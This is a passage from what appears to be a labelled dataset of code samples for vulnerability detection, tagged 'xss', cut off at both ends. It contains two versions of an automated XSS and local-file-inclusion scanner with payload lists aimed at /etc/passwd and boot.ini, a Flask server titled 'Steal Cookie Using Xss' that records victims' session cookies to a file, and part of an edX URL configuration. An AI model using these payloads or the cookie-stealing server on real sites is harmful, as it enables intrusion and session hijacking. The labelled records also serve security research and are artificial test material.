furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        for lfi_result in lfi_expect:\n            if r.content.find(lfi_result)>=0:\n                print \"[+] Target is VULNERABLE\"\n                print \"Url: \" + url\n                print \"Parameters: %s\\n\" % str(post_params)\n\n                #comment out the return if you want all the findings\n                return\n    return\n\n\ndef scan_for_forms(fname, host, url, scanopt):\n    print \"[+] Start scan\"\n    rtype=\"\"\n    has_form=0\n    params = []\n    hidden_param_name=[]\n    hidden_param_value=[]\n    page = \"\"\n    form_counter = 0\n\n    try:\n        with open(fname, \"r\") as f:\n            for line in f:\n\n                #now that we've collected all the parameters\n                #let's check if the page is vulnerable\n                if line.find(\"</form>\") >=0:\n                    has_form=0\n                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):\n                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:\n                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:\n                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        params=[]\n                        hidden_param_name=[]\n                        hidden_param_value=[]\n                        page=\"\"\n\n                #add input parameters to list\n                if has_form == 1:\n                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                    if m_input:\n                        #check if the parameters already has a value assigned\n                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                        if m_value:\n                            hidden_param_name.append(m_input.group(2))\n                            hidden_param_value.append(m_value.group(2))\n                        else:\n                            params.append(m_input.group(2))\n\n                #detect forms\n                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)\n                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)\n                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)\n                if m_action or m_same:\n                    has_form=1\n                    form_counter+=1\n                    if m_same:\n                        page=\"\"\n                    else:\n                        page=m_action.group(1)\n                    rtype=\"get\"\n                    if m_reqtype:\n                        rtype=m_reqtype.group(1)\n                    print \"[+] Form detected. Method \" + rtype.upper()\n\n    except Exception, e:\n        print \"[-] scan_for_forms(): Error \" + str(e)\n\n        #enable the following lines if you want more details\n        #exc_type, exc_obj, exc_tb = sys.exc_info()\n        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]\n        #print(exc_type, fname, exc_tb.tb_lineno)\n\n    return\n\ndef help():\n    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"\n    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"\n    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"\n    print \"\\nExamples:\"\n    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"\n    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"\n\n###MAIN###\nif __name__ == \"__main__\":\n    print \"BEstAutomaticXSSFinder v1.0\"\n    print \"DISCLAIMER: For testing purposes only!\\n\"\n\n    if len(sys.argv) < 2 or len(sys.argv) > 3:\n        print \"program [scan options] [url]\\n\"\n        help()\n        exit()\n\n    scanopt =\"--all\"\n    url = \"\"\n    \n    if sys.argv[1].find(\"http\") == 0:\n        url = sys.argv[1]\n        if len(sys.argv) == 3:\n            scanopt = sys.argv[2]\n    else:\n        if len(sys.argv) == 3:\n            if sys.argv[1].find(\"--check\") == 0:\n                scanopt = sys.argv[1]\n                url = sys.argv[2]\n\n    if url.find(\"http\") != 0:\n        print \"[-] Invalid target\"\n        exit()\n\n    m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M)\n    if m:\n        host = m.group(2)\n    else:\n        print \"[-] Can't get host information\"\n        exit()\n\n    print \"[+] Host acquired \" + host\n    print \"[+] Retrieve page\"\n    try:\n        r = requests.get(url)\n        s = r.content.replace(\">\", \">\\n\")\n\n        #good to have a local copy for testing\n        with open(\"tmpage.txt\", \"w\") as f:\n            f.write(s)\n\n        scan_for_forms(\"tmpage.txt\", host, url, scanopt)\n        if DEBUG == 0:\n            os.remove(\"tmpage.txt\")\n    except Exception, e:\n        print \"[-] Main(): Error \" + str(e)\n\nprint \"[*] Done\"\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "73d12b579a488013c561179bb95b1d45c2b48e2f", "code": "/scripts/beaxssf.py/n/n#! python\n###############################################\n#   BEstAutomaticXSSFinder                    #\n#   Author: malwrforensics                    #\n#   Contact: malwr at malwrforensics dot com  #\n###############################################\n\nimport sys\nimport os\nimport requests\nimport re\n\nDEBUG = 0\nxss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n                \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                \"<img src=test123456.jpg onerror=alert(1)>\"]\n\nlfi_attacks = [\n                #linux\n                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',\n                '../../../../../etc/passwd', '../../../../../../etc/passwd',\n                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',\n                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',\n                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n\n                #windows\n                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',\n                '../../../../../boot.ini', '../../../../../../boot.ini',\n                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',\n                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',\n                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',\n                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',\n                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'\n                ]\n\nlfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']\n\ndef check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global xss_attacks\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] XSS check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for xss in xss_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = xss\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        if r.content.find(xss)>=0:\n            print \"[+] Target is VULNERABLE\"\n            print \"Url: \" + url\n            print \"Parameters: %s\\n\" % str(post_params)\n\n            #comment out the return if you want all the findings\n            return\n    return\n\ndef check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global lfi_attacks\n    global lfi_expect\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] LFI check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for lfi in lfi_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = lfi\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        for lfi_result in lfi_expect:\n            if r.content.find(lfi_result)>=0:\n                print \"[+] Target is VULNERABLE\"\n                print \"Url: \" + url\n                print \"Parameters: %s\\n\" % str(post_params)\n\n                #comment out the return if you want all the findings\n                return\n    return\n\n\ndef scan_for_forms(fname, host, url):\n    print \"[+] Start scan\"\n    rtype=\"\"\n    has_form=0\n    params = []\n    hidden_param_name=[]\n    hidden_param_value=[]\n    page = \"\"\n    form_counter = 0\n    try:\n        with open(fname, \"r\") as f:\n            for line in f:\n\n                #now that we've collected all the parameters\n                #let's check if the page is vulnerable\n                if line.find(\"</form>\") >=0:\n                    has_form=0\n                    if len(page) > 0 and len(params) > 0:\n                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        params=[]\n                        hidden_param_name=[]\n                        hidden_param_value=[]\n                        page=\"\"\n\n                #add input parameters to list\n                if has_form == 1:\n                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n                    if m_input:\n                        #check if the parameters already has a value assigned\n                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n                        if m_value:\n                            hidden_param_name.append(m_input.group(2))\n                            hidden_param_value.append(m_value.group(2))\n                        else:\n                            params.append(m_input.group(2))\n\n                #detect forms\n                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n                if m_action or m_same:\n                    has_form=1\n                    form_counter+=1\n                    if m_same:\n                        page=\"\"\n                    else:\n                        page=m_action.group(1)\n                    rtype=\"get\"\n                    if m_reqtype:\n                        rtype=m_reqtype.group(1)\n                    print \"[+] Form detected. Method \" + rtype.upper()\n\n    except Exception, e:\n        print \"[-] scan_for_forms(): Error \" + str(e)\n\n        #enable the following lines if you want more details\n        #exc_type, exc_obj, exc_tb = sys.exc_info()\n        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]\n        #print(exc_type, fname, exc_tb.tb_lineno)\n\n    return\n\ndef banner():\n    print \"BEstAutomaticXSSFinder v1.0\"\n    print \"DISCLAIMER: For testing purposes only!\\n\"\n\n###MAIN###\nif __name__ == \"__main__\":\n    banner()\n\n    if len(sys.argv) != 2:\n        print \"program [url]\"\n        exit()\n\n    url = sys.argv[1]\n    if url.find(\"http\") != 0:\n        print \"[-] Invalid target\"\n        exit()\n\n    m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M)\n    if m:\n        host = m.group(2)\n    else:\n        print \"[-] Can't get host information\"\n        exit()\n\n    print \"[+] Host acquired \" + host\n    print \"[+] Retrieve page\"\n    try:\n        r = requests.get(url)\n        s = r.content.replace(\">\", \">\\n\")\n\n        #good to have a local copy for testing\n        with open(\"tmpage.txt\", \"w\") as f:\n            f.write(s)\n\n        scan_for_forms(\"tmpage.txt\", host, url)\n        os.remove(\"tmpage.txt\")\n    except Exception, e:\n        print \"[-] Main(): Error \" + str(e)\n\nprint \"[*] Done\"\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "d20b8de6b838a490155218b2306c87f6060713a6", "code": "xss.py/n/ntry:\n\tfrom flask import Flask,request\n\tfrom termcolor import colored\n\tfrom time import sleep\nexcept:\n\tprint('[!] Install The Modules .. ')\n\timport os\n\tos.system('pip install flask')\n\tos.system('pip install termcolor')\n\tos.system('pip install time')\n\tsys.exit()\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "d20b8de6b838a490155218b2306c87f6060713a6", "code": "/xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        